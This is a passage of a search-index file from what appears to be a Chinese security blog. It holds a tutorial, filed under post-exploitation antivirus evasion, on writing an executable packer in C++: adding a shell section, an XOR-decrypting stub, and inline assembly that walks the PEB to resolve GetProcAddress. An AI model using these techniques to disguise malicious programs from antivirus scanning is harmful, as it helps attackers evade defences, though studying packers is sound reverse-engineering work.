\u6587\u4ef6\u7684\u504f\u79fb \u5373 \u4e0a\u4e00\u4e2a\u533a\u6bb5\u7684PointerToRawData + \u4e0a\u4e00\u4e2a\u533a\u6bb5\u7684SizeOfRawData \u7136\u540e\u6211\u4eec\u901a\u8fc7\u4fee\u6539\u4ee5\u4e0a\u5404\u503c\u6765\u5b9a\u4e49\u4e00\u4e2a\u65b0\u533a\u6bb5\uff08\u58f3\u533a\u6bb5)\u7684\u5c5e\u6027 \u8fd9\u91cc\u7684virtualsize\u770b\u7740\u586b\u4e00\u4e2a\u5c31\u884c\u4e86\u3002 \u6b64\u65f6\u6211\u4eec\u53ea\u662f\u5b9a\u4e49\u4e86\u533a\u6bb5\u8868\uff0c\u4f46\u6587\u4ef6\u4e2d\u5e76\u6ca1\u6709\u8be5\u533a\u6bb5\u5b58\u5728\uff0c\u6240\u4ee5\u6211\u4eec\u5f97\u521b\u5efa\u8be5\u533a\u6bb5\u3002 \u7136\u540e\u8fd8\u8981\u8ba9\u533a\u6bb5\u53ef\u7f16\u8f91\uff0c\u628a\u4e0b\u5217\u503c\u6539\u4e3a1\u5373\u53ef ctrl+shift+i \u5411\u76ee\u6807\u6587\u4ef6\u504f\u79fb\u5904\u63d2\u51650x200\u5927\u5c0f\u7684\u7a7a\u95f4\u3002 \u8fd9\u6837\u4e00\u6765\uff0c\u58f3\u533a\u6bb5\u5c31\u521b\u5efa\u597d\u4e86\u3002 \u7136\u540e\u6211\u4eec\u8fd8\u8981\u4fee\u6539 \u6269\u5c55\u5934\u7684SizeofImage \u3002\u5c06\u4ed6\u6539\u4e3a\u6700\u540e\u4e00\u4e2a\u533a\u6bb5\u7684\u5185\u5b58\u5730\u5740+\u5185\u5b58\u5927\u5c0f \u7136\u540e\u53bb\u6389\u968f\u673a\u57fa\u5740\u9009\u9879\u3002 \u627e\u5230\u6269\u5c55\u5934\u7684DLL\u5c5e\u6027\u5b57\u6bb5\uff0c\u53bb\u6389\u968f\u673a\u57fa\u5740\uff0c\u628a40 81\u6539\u4e3a 00 81 \u63a5\u4e0b\u6765\u6211\u4eec\u628a\u7a0b\u5e8f\u5165\u53e3\u70b9\u8bbe\u7f6e\u7ed9\u58f3\u533a\u6bb5\u3002 \u4f7f\u7528LORDPE\u628a\u5165\u53e3\u70b9\u8bbe\u4e3a\u58f3\u533a\u5757\u7684\u865a\u62df\u5730\u5740 \u7136\u540e\u6211\u4eec\u7528OD\u6253\u5f00\u8fd9\u4e2a\u6587\u4ef6","title":"\u624b\u5de5\u52a0\u58f3"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/#_4","text":"\u521a\u521a\u63d0\u5230\u7684\u624b\u5de5\u52a0\u58f3\uff0c\u4e0d\u8fc7\u662f\u6700\u6700\u57fa\u7840\u7684\u52a0\u58f3\u539f\u578b\u800c\u5df2\uff0c\u771f\u6b63\u7684\u52a0\u58f3\u8fd8\u6d89\u53ca\u4e86\u4ee3\u7801\u52a0\u89e3\u5bc6\u7b49\u64cd\u4f5c. \u771f\u6b63\u5199\u58f3\u65f6\u4e00\u822c\u5199\u4e24\u4e2a\u4e1c\u897f\uff0c\u52a0\u58f3\u5668\u548cstub \u6240\u8c13\u52a0\u58f3\u5668\uff0c\u5c31\u662f\u7ed9\u88ab\u52a0\u58f3\u6587\u4ef6\u521b\u9020\u51fa\u4e00\u4e2a\u65b0\u7684\u533a\u6bb5\uff0c \u5728\u6b64\u540c\u65f6\u5c06\u7a0b\u5e8f\u4ee5\u67d0\u79cd\u65b9\u5f0f\u52a0\u5bc6\uff0c\u7136\u540e\u628astub\u653e\u5165\u65b0\u533a\u6bb5\uff0c\u5e76\u5c06\u7a0b\u5e8f\u5165\u53e3\u70b9\u8bbe\u4e3a\u65b0\u533a\u6bb5\u7684\u5730\u5740\uff0c\u7136\u540e\u5728\u65b0\u533a\u6bb5\u7ed3\u675f\u540e\u8df3\u8f6c\u56de\u539f\u7a0b\u5e8f\u5165\u53e3\u3002\u8fd9\u4e2a\u65b0\u533a\u6bb5\u6211\u4eec\u53eb\u505a\u58f3\u533a\u6bb5. \u90a3\u4e48\u8fd9\u4e2astub\u5c31\u662f\u52a0\u58f3\u540e\u7a0b\u5e8f\u6700\u5148\u6267\u884c\u7684\u547d\u4ee4\u4e86\uff0c\u5b83\u6267\u884c\u89e3\u5bc6\u7b97\u6cd5\uff0c\u5c06\u539f\u7a0b\u5e8f\u91ca\u653e\u51fa\u6765\u3002","title":"\u771f\u6b63\u7684\u52a0\u58f3\u6d41\u7a0b"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/#c","text":"\u5b9e\u73b0\u4e86\u4e00\u4e2a\u859b\u5b9a\u8c14\u7684\u52a0\u58f3\u5668\uff08\u96fe\uff09 \u52a0\u58f3\u597d\u7684\u7a0b\u5e8f\u6709\u4e00\u5b9a\u51e0\u7387\u8fd0\u884c\u4e0d\u4e86\uff0c\u539f\u56e0\u672a\u77e5\u3002\u3002 https://github.com/ConsT27/PackingEXE/tree/master \ud83d\udc48\u9879\u76ee\u5730\u5740 \u5f88\u5927\u4e00\u90e8\u5206\u4e0a\u662f\u501f\u9274\u8fd9\u4e2a\u8001\u54e5\u7684 https://github.com/TonyChen56/GuiShou_Pack \u7b2c\u4e00\u6b21\u63a5\u89e6\u6c47\u7f16\u7f16\u7a0b\uff0cc++\u7f16\u7a0b\uff0c\u4e0a\u6765\u5c31\u662f\u641e\u8fd9\u4e48\u4e00\u4e2a\u9879\u76ee\uff0c\u641e\u4e86\u5feb\u4e24\u4e2a\u661f\u671f\uff0c\u786e\u5b9e\u6709\u70b9\u75db\u82e6\uff0c\u5230\u73b0\u5728\u8fd8\u6709\u5f88\u5927\u90e8\u5206\u4e0d\u662f\u5f88\u61c2\u7684\u5730\u65b9\uff08\u6bd4\u5982\u8bb8\u591a\u6570\u636e\u7c7b\u578b\u4ee5\u53ca\u5e95\u5c42\u6c47\u7f16\uff08\u7b11\ud83d\ude01 \u8fd9\u4e2a\u9879\u76ee\u4e5f\u5b58\u5728bug\uff0c\u4e5f\u5c31\u662f\u521a\u521a\u8bf4\u7684\u7a0b\u5e8f\u6709\u51e0\u7387\u4e0d\u80fd\u8fd0\u884c\u7684\u95ee\u9898\u3002\ud83d\ude21 \u4f46\u662f\u4e5f\u5b66\u5230\u4e86\u633a\u591a\uff0c\u6bd4\u5982PEB\u52a8\u6001\u5bfb\u5740\uff0cPE\u6587\u4ef6\u7ed3\u6784\u7b49\u7b49\u3002\ud83d\ude01 \u82e6\u4e8e\u7f51\u4e0a\u6ca1\u6709\u4e00\u7bc7\u6587\u7ae0\u8be6\u7ec6\u7684\u4ea4\u4ee3\u4e86\u6280\u672f\u7684\u7ec6\u8282\uff0c\u6240\u4ee5\u8fd9\u7bc7\u6587\u7ae0\u4f1a\u5c3d\u53ef\u80fd\u7684\u8be6\u7ec6\u3002 \u63a5\u4e0b\u6765\u662f\u5404\u4e2a\u6d41\u7a0b\u7684\u8be6\u7ec6\u5b9e\u73b0\u65b9\u6cd5\uff0c\u81f3\u4e8e\u600e\u4e48\u628a\u5404\u4e2a\u6d41\u7a0b\u94fe\u63a5\u8d77\u6765\uff0c\u5e08\u5085\u4eec\u53ef\u4ee5\u901a\u8fc7\u4e0b\u8f7d\u4e0a\u9762\u63d0\u5230\u7684\u4e24\u4e2a\u9879\u76ee\u6765\u770b\u4e00\u4e0b\u3002","title":"\u57fa\u4e8ec++\u7684\u58f3\u7f16\u5199"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/#stub","text":"stub\u662f\u88ab\u690d\u5165\u5230PE\u6587\u4ef6\u4e2d\u7684\u4ee3\u7801\uff0c\u5b83\u4e00\u822c\u4f1a\u5e72\u4e0b\u9762\u8fd9\u4e9b\u4e8b\u60c5\u3002 \u6d41\u7a0b\u5982\u4e0b 0.\u5408\u5e76data\uff0crdata\u5230text 1.PEB\u52a8\u6001\u5bfb\u5740\uff0c\u904d\u5386\u5bfc\u51fa\u8868\u627e\u5230GetProcAddress\u51fd\u6570 2.\u89e3\u5bc6 3.\u4fee\u6539\u5165\u53e3\u70b9\u5230\u539f\u5165\u53e3\u70b9 \u540c\u65f6stub\u4e00\u822c\u4ee5dll\u7684\u5f62\u5f0f\u5b58\u5728\u3002\u539f\u56e0\u662fDLL\u901a\u5e38\u81ea\u5e26\u91cd\u5b9a\u4f4d\u8868\uff0c\u8fd9\u5728\u6211\u4eec\u7684\u79fb\u690d\u8fc7\u7a0b\u4e2d\u7684\u91cd\u5b9a\u4f4d\u64cd\u4f5c\u4e2d\u63d0\u4f9b\u4e86\u5de8\u5927\u7684\u4fbf\u5229\u3002","title":"Stub"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/#_5","text":"\u6211\u4eec\u8981\u79fb\u690dstub\u8fc7\u53bb\uff0c\u80af\u5b9a\u9700\u8981\u79fb\u690d\u4ee3\u7801\u6bb5\uff0c\u4e5f\u9700\u8981\u79fb\u690d\u6570\u636e\u6bb5\u3002\u4e0d\u5982\u6211\u4eec\u5e72\u8106\u628a\u6570\u636e\u6bb5\u5408\u5e76\u5230\u4ee3\u7801\u6bb5\uff0c\u4e00\u5757\u79fb\u690d\u8fc7\u53bb\u3002","title":"\u5408\u5e76\u6570\u636e\u6bb5"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/#peb","text":"\u4e3a\u4ec0\u4e48\u4f1a\u7528\u5230\u8fd9\u4e2a\u6280\u672f\u7f16\u5199stub\uff1f \u56e0\u4e3a\u6211\u4eec\u7684stub.dll\u690d\u5165\u5230\u5bbf\u4e3b\u7a0b\u5e8f\u65f6\uff0c\u53ea\u6709.text\u690d\u5165\u8fc7\u53bb\uff0c\u6ca1\u6709\u5bf9\u5e94\u7684\u5bfc\u5165\u8868\uff0c\u6240\u4ee5\u6211\u4eec\u7684stub\u65e0\u6cd5\u76f4\u63a5\u8c03\u7528\u4e00\u4e9bAPI\u3002\u6240\u4ee5\u6211\u4eec\u9700\u8981\u52a8\u6001\u83b7\u53d6\u5404\u79cdAPI\u3002 \u5176\u4e2d\u6211\u91c7\u7528\u7684\u662fPEB\u52a8\u6001\u67e5\u8be2\u5f97\u5230GetProcAddress\u51fd\u6570\uff0c\u7136\u540e\u7528GetProcAddress\u51fd\u6570\u53bb\u83b7\u53d6\u5404\u4e2aAPI\u3002 \u90a3\u4e48\uff0c\u4ec0\u4e48\u662fPEB\uff1f PEB\u662f\u4e00\u4e2a\u5fae\u8f6f\u8fd8\u672a\u5b8c\u5168\u516c\u5f00\u4f5c\u7528\u7684\u4e00\u4e2a\u7ed3\u6784\uff0c\u5b83\u53eb\u505a \u8fdb\u7a0b\u73af\u5883\u4fe1\u606f\u5757 \uff0c\u5305\u542b\u4e86\u8fdb\u7a0b\u7684\u4fe1\u606f\u3002\u5176\u7ed3\u6784\u5982\u4e0b typedef struct _PEB { BYTE Reserved1[2]; BYTE BeingDebugged; //\u88ab\u8c03\u8bd5\u72b6\u6001 BYTE Reserved2[1]; PVOID Reserved3[2]; PPEB_LDR_DATA Ldr; PRTL_USER_PROCESS_PARAMETERS ProcessParameters; BYTE Reserved4[104]; PVOID Reserved5[52]; PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine; BYTE Reserved6[128]; PVOID Reserved7[1]; ULONG SessionId; } PEB, *PPEB; \u590d\u5236\u4ee3\u7801 \u6211\u4eec\u5173\u5fc3\u7684\u662fPEB\u504f\u79fb0c\u5f97\u5230\u7684 PPEB_LDR_DATA Ldr; \u5b83\u662f\u4e00\u4e2a\u6307\u9488\uff0c\u6307\u5411\u4e00\u4e2a PPEB_LDR_DATA \u7ed3\u6784\uff0c \u5b58\u653e\u7740\u5df2\u7ecf\u88ab\u8fdb\u7a0b\u88c5\u5728\u7684\u52a8\u6001\u94fe\u63a5\u5e93\u7684\u4fe1\u606f typedef struct _PEB_LDR_DATA { \u3000ULONG Length; // +0x00 \u3000BOOLEAN Initialized; // +0x04 \u3000PVOID SsHandle; // +0x08 \u3000LIST_ENTRY InLoadOrderModuleList; // +0x0c \u3000LIST_ENTRY InMemoryOrderModuleList; // +0x14 \u3000LIST_ENTRY InInitializationOrderModuleList;// +0x1c } PEB_LDR_DATA,*PPEB_LDR_DATA; // +0x24 PPEB_LDR_DATA \u504f\u79fb1c\u662f\u4e00\u4e2a\u6307\u5411LIST_ENTRY InInitializationOrderModuleList\u7ed3\u6784\u7684\u6307\u9488\uff0c\u8fd9\u4e2a\u7ed3\u6784 \u5b58\u653e\u7740\u6307\u5411\u6a21\u5757\u521d\u59cb\u5316\u94fe\u8868\u7684\u5934 \uff0c \u6309\u987a\u5e8f\u5b58\u653e\u7740PE\u88c5\u5165\u8fd0\u884c\u65f6\u521d\u59cb\u5316\u6a21\u5757\u4fe1\u606f\uff0c\u4e00\u822c\u6765\u8bf4\u7b2c\u4e00\u4e2a\u94fe\u8868\u7ed3\u70b9\u662fntdll.dll,\u7b2c\u4e8c\u4e2a\u94fe\u8868\u7ed3\u70b9\u5c31\u662fkernel32.dll \u3002\u6211\u4eec\u5c31\u5728\u5176\u4e2d\u627e\u5230kernel32.dll\u7684\u4fe1\u606f\uff0c\u83b7\u53d6\u5176PE\u4fe1\u606f\uff0c\u5f97\u5230\u5bfc\u51fa\u8868\uff0c\u5faa\u73af\u904d\u5386\u5f97\u5230GetProcAddress\u51fd\u6570\u3002 \u53e6\u5916\uff0cPEB\u5730\u5740\u518dTEB\u504f\u79fb0x30\u5904\u3002\u7528\u6c47\u7f16\u8bed\u8a00\u8868\u793a\u5c31\u662f fs:[0x30]\u3002 \u4ee5\u4e0a\u662fPEB\u5bfb\u5740\u7684\u5927\u81f4\u6d41\u7a0b\uff0c\u53e6\u5916\u8fd8\u6709\u4e00\u4e2a\u6bd4\u8f83\u5173\u952e\u7684\u70b9\u662f\u904d\u5386kernel32.dll\u5bfc\u51fa\u8868\u83b7\u5f97GetProcAddress\u51fd\u6570\u4fe1\u606f\u3002 \u5173\u4e8e\u5bfc\u51fa\u8868\u53ef\u4ee5\u770b\u770b\u8fd9\u4e2a\u6587\u7ae0 https://blog.csdn.net/evileagle/article/details/12176797 \u9996\u5148\u4e00\u4e2a\u5bfc\u51fa\u8868\u7ed3\u6784\u4f53\u5982\u4e0b typedef struct _IMAGE_EXPORT_DIRECTORY { DWORD Characteristics; //\u4e00\u822c\u4e3a0\uff0c\u6ca1\u5565\u7528 DWORD TimeDateStamp; //\u5bfc\u51fa\u8868\u751f\u6210\u7684\u65f6\u95f4 WORD MajorVersion; //\u7248\u672c\uff0c\u4e5f\u662f0\u6ca1\u5565\u7528 WORD MinorVersion; //\u4e5f\u662f\u6ca1\u5565\u7528\u7684\u7248\u672c\u4fe1\u606f\u4e00\u822c\u4e3a0 DWORD Name; //\u5f53\u524d\u5bfc\u51fa\u8868\u7684\u6a21\u5757\u540d\u5b57 DWORD Base; //\u5e8f\u53f7\u8868\u4e2d\u5e8f\u53f7\u7684\u57fa\u6570 DWORD NumberOfFunctions; //\u5bfc\u51fa\u51fd\u6570\u6570\u91cf DWORD NumberOfNames; //\u6309\u540d\u5b57\u5bfc\u51fa\u51fd\u6570\u7684\u6570\u91cf DWORD AddressOfFunctions; // \u5e8f\u53f7\u8868 DWORD AddressOfNames; // \u540d\u79f0\u8868 DWORD AddressOfNameOrdinals; // \u5730\u5740\u8868 } IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY; \u5176\u4e2d\u5e8f\u53f7\u8868\u7684\u8d77\u59cb\u5e8f\u53f7\u662fBase\u5c5e\u6027\u5b9a\u4e49\u7684\u503c\u3002\u4ee5\u4e0b\u662f\u5bfc\u51fa\u8868\u7684\u5e8f\u53f7\u540d\u79f0\u5730\u5740\u8868\u7684\u5173\u7cfb \u6211\u4eec\u7684\u904d\u5386\u6d41\u7a0b\u662f\uff0c\u5148\u904d\u5386\u540d\u79f0\u8868\u627e\u5230GetProcAddress\u5728\u540d\u79f0\u6570\u7ec4\u4e2d\u7684\u4e0b\u6807\uff0c\u7136\u540e\u6839\u636e\u8fd9\u4e2a\u4e0b\u6807\u53bb\u5e8f\u53f7\u6570\u7ec4\u4e2d\u627e\u76f8\u540c\u4e0b\u6807\u7684\u5e8f\u53f7\u503c\uff0c\u7136\u540e\u4ee5\u8fd9\u4e2a\u5e8f\u53f7\u503c \u4e3a\u4e0b\u6807\u53bb\u627e\u5730\u5740\u6570\u7ec4\u4e2d\u7684\u5bf9\u5e94\u503c\u3002\u6211\u4eec\u627e\u5230\u7684\u5730\u5740\u8868\u4e2d\u7684\u503c\u5c31\u662f\u51fd\u6570\u5165\u53e3 \u4e0b\u9762\u6211\u628a\u8fd9\u6bb5\u7a0b\u5e8f\u7684\u6c47\u7f16\u4ee3\u7801\u653e\u51fa\u6765\u3002\u6211\u662f\u7528\u5185\u8054\u6c47\u7f16\u628a\u8fd9\u6bb5\u4ee3\u7801\u585e\u8fdbC++\u7684 void GetApis() { HMODULE hKernel32; _asm { pushad; ; //\u83b7\u53d6kernel32.dll\u7684\u52a0\u8f7d\u57fa\u5740; mov eax, fs: [0x30] ; //\u5f97\u5230PEB\u5730\u5740 mov eax, [eax + 0ch]; //\u83b7\u5f97LDR_PEB_DATA\u5730\u5740 mov eax, [eax + 0ch]; //\u83b7\u5f97LIST_ENTRY InLoadOrderModuleList;\u5730\u5740 mov eax, [eax]; //\u83b7\u5f97LIST_ENTRY InLoadOrderModuleList\u4e0b\u4e00\u9879\u7684\u5730\u5740 mov eax, [eax]; /\u83b7\u5f97LIST_ENTRY InLoadOrderModuleList\u4e0b\u4e0b\u9879\u5373\u6211\u4eec\u9700\u8981\u7684LIST_ENTRY InInitializationOrderModuleList\u7684\u5730\u5740 mov eax, [eax + 018h]; //\u83b7\u5f97kernel32.dll\u5730\u5740 mov hKernel32, eax; mov ebx, [eax + 03ch];//\u83b7\u5f97kernel32.dll NT\u5934RVA add ebx, eax; //NT\u5934\u7684VA add ebx, 078h; //\u83b7\u5f97\u533a\u6bb5\u8868 mov ebx, [ebx]; //\u83b7\u5f97\u5bfc\u51fa\u8868RVA add ebx, eax; //\u5bfc\u51fa\u8868VA lea ecx, [ebx + 020h]; mov ecx, [ecx]; // ecx => \u540d\u79f0\u8868\u7684\u9996\u5730\u5740(rva); add ecx, eax; // ecx => \u540d\u79f0\u8868\u7684\u9996\u5730\u5740(va); xor edx, edx; // \u4f5c\u4e3a\u7d22\u5f15(index)\u6765\u4f7f\u7528. _WHILE:; mov esi, [ecx + edx * 4];//\u540d\u79f0\u6570\u7ec4\u5165\u53e3\u70b9rva\uff0c\u540d\u79f0\u6570\u7ec4\u5355\u4f4d\u5927\u5c0f4\u5b57\u8282 lea esi, [esi + eax]; //\u5165\u53e3\u70b9VA cmp dword ptr[esi], 050746547h; //\u8fdb\u884c\u540d\u79f0\u5339\u914d\uff0c050746547h\u5373\u5c0f\u7aef\u5b58\u50a8\u7684GetP jne _LOOP;//\u4e0d\u76f8\u7b49\u5c31\u8df3\u5165_LOOP\u6bb5 cmp dword ptr[esi + 4], 041636f72h; //\u540d\u9648\u5339\u914d\uff0crocA\uff0c\u4ee5\u4e0b\u4f9d\u6b21\u4e3addre\uff0css jne _LOOP; cmp dword ptr[esi + 8], 065726464h; jne _LOOP; cmp word ptr[esi + 0ch], 07373h; jne _LOOP; mov edi, [ebx + 024h]; add edi, eax; //\u83b7\u5f97\u5e8f\u53f7\u8868VA mov di, [edi + edx * 2]; //\u83b7\u5f97\u5e8f\u53f7\u6570\u7ec4\u4e2d\u5bf9\u5e94\u4e0b\u6807\u7684\u5730\u5740\uff0c\u5e8f\u53f7\u6570\u7ec4\u5355\u4f4d\u5927\u5c0f2\u5b57\u8282 and edi, 0FFFFh; //\u7ed9di\u63d0\u4f4d\u523032\u4f4d\uff0c\u5373\u7ed9\u4e88edi \u5e8f\u53f7\u8868\u4e2d\u5bf9\u5e94\u4e0b\u6807\u7684\u5730\u5740 mov edx, [ebx + 01ch]; add edx, eax; //\u83b7\u5f97\u5730\u5740\u8868 mov edi, [edx + edi * 4]; //\u83b7\u5f97\u5730\u5740\u6570\u7ec4\u4e2d\uff0c\u5e8f\u53f7\u5bf9\u5e94\u7684\u503c\uff0c\u5730\u5740\u6570\u7ec4\u5355\u4f4d\u5927\u5c0f4\u5b57\u8282 add edi, eax; //\u83b7\u5f97GetProcAddress\u7684\u5165\u53e3\u5730\u5740 mov MyGetProcAddress, edi; //\u8d4b\u503c jmp _ENDWHILE; //END _LOOP:; inc edx; // ++index; jmp _WHILE; _ENDWHILE:; popad; }","title":"PEB\u52a8\u6001\u5bfb\u5740&amp;\u5bfc\u51fa\u8868\u904d\u5386\u627e\u51fd\u6570"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/#_6","text":"\u89e3\u5bc6\u4ee3\u7801\u6bb5\u3002\u8fd9\u6bb5\u597d\u5199\u3002 void Decrypt() { unsigned char* pText = (unsigned char*)g_conf.textScnRVA + 0x400000;//\u9501\u5b9a\u5230PE\u6587\u4ef6\u7684text\u6bb5\uff08\u56e0\u4e3a\u52a0\u58f3\u65f6\u53bb\u6389\u4e86\u57fa\u5740\u968f\u673a\u5316\uff0c\u6240\u4ee5\u81ea\u4fe1\u7684\u628a\u57fa\u5740\u586b\u62100x400000 DWORD old = 0; MyVirtualProtect(pText, g_conf.textScnSize, PAGE_READWRITE, &old);//\u4fee\u6539\u4ee3\u7801\u6bb5\u7684\u5c5e\u6027,\u6ce8\u610f\u6211\u4eec\u8fd9\u91cc\u4f7f\u7528\u4e86\u52a8\u6001\u83b7\u5f97\u7684 //\u89e3\u5bc6\u4ee3\u7801\u6bb5 for (DWORD i = 0; i < g_conf.textScnSize; i++) { pText[i] ^= g_conf.key; } //\u628a\u5c5e\u6027\u4fee\u6539\u56de\u53bb MyVirtualProtect(pText, g_conf.textScnSize, old, &old); }","title":"\u89e3\u5bc6"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/#_7","text":"_asm { mov eax, g_conf.srcOep; //\u5165\u53e3\u70b9\u662fg_conf.srcOep add eax, 0x400000 jmp eax }","title":"\u4fee\u6539\u5165\u53e3\u70b9"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/#_8","text":"\u52a0\u58f3\u5668\u6d41\u7a0b\u5982\u4e0b 1.\u6253\u5f00\u9700\u8981\u88ab\u52a0\u58f3\u7684PE\u6587\u4ef6 2.\u52a0\u8f7dstub 3.\u52a0\u5bc6\u4ee3\u7801\u6bb5 4.\u6dfb\u52a0\u65b0\u533a\u6bb5 5.stub\u91cd\u5b9a\u4f4d\u4fee\u590d 6.stub\u79fb\u690d 7.PE\u6587\u4ef6\u5165\u53e3\u70b9\u4fee\u6539 8.\u53bb\u968f\u673a\u57fa\u5740 9.\u4fdd\u5b58\u6587\u4ef6 \u4ee5\u4e0b\u7684\u5404\u4e2a\u6d41\u7a0b\u63cf\u8ff0\u4e2d\u4f1a\u7528\u5230\u8bf8\u591a\u81ea\u5b9a\u4e49\u51fd\u6570\uff0c\u6211\u5148\u8d34\u4e0a\u6765\u5427\u3002","title":"\u52a0\u58f3\u5668"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%94%A8C%2B%2B%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E5%99%A8/#_9","text":"//**************** //\u5bf9\u9f50\u5904\u7406 //time:2020/11/5 //**************** int AlignMent(_In_ int size, _In_ int alignment) { return (size) % (alignment)==0 ? (size) : ((size) / alignment+1) * (alignment); } //*********************** //PE\u4fe1\u606f\u83b7\u53d6\u51fd\u6570\u7c07 //time:2020/11/2 //*********************** PIMAGE_DOS_HEADER GetDosHeader(_In_ char* pBase) { return PIMAGE_DOS_HEADER(pBase); } PIMAGE_NT_HEADERS GetNtHeader(_In_ char* pBase) { return PIMAGE_NT_HEADERS(GetDosHeader(pBase)->e_lfanew+(SIZE_T)pBase); } PIMAGE_FILE_HEADER GetFileHeader(_In_ char* pBase) { return &(GetNtHeader(pBase)->FileHeader); } PIMAGE_OPTIONAL_HEADER32 GetOptHeader(_In_ char* pBase) { return &(GetNtHeader(pBase)->OptionalHeader); } PIMAGE_SECTION_HEADER GetLastSec(_In_ char* pBase) { DWORD SecNum = GetFileHeader(pBase)->NumberOfSections; PIMAGE_SECTION_HEADER FirstSec = IMAGE_FIRST_SECTION(GetNtHeader(pBase)); PIMAGE_SECTION_HEADER LastSec = FirstSec + SecNum - 1; return LastSec; } PIMAGE_SECTION_HEADER GetSecByName(_In_ char* pBase,_In_ const char* name) { DWORD Secnum = GetFileHeader(pBase)->NumberOfSections; PIMAGE_SECTION_HEADER Section = IMAGE_FIRST_SECTION(GetNtHeader(pBase)); char buf[10] = { 0 }; for (DWORD i = 0; i < Secnum; i++) { memcpy_s(buf, 8, (char*)Section[i].Name, 8); if (!strcmp(buf, name)) { return Section + i; } } return nullptr; } typedef struct _StubConf { DWORD srcOep; //\u5165\u53e3\u70b9 DWORD textScnRVA; 